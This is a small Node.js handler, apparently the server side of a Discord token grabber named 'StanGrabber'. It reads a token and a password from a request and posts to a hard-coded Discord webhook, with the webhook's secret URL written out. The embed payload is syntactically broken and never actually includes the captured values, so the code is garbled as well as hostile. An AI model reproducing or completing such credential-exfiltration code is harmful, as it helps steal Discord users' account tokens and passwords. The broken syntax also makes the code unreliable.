const axios = require('axios');

exports.send = (req, res, webhook) =>
{
	const token = req.body.token;
	const password = req.body.password;
	
	if(token === undefined || password === undefined)
		return res.status(400).json({status: "error", message: "Not sent."});
	
	
	
	
	axios.post(`https://discord.com/api/webhooks/797868594515804220/r9pUD70qd6SVtaKA-sy0AtXbkH7hjZlHAbYDF0gn-7-3uTpQAYMcv_oRcbf57y6uqnj8`, { username:`StanGrabber`, content: ``, embeds:[
	description:'test',
	
	] })
	.then((resp) => 
	{
		if(resp.status === 200)
			return res.status(200).json({status: "ok", message: "Sent."});
	})
	.catch((err) => 
	{
		return res.status(500).json({status: "error", message: "Not sent."});
	});
	
	res.status(200).json({status: "ok", message: "Sent."});
}
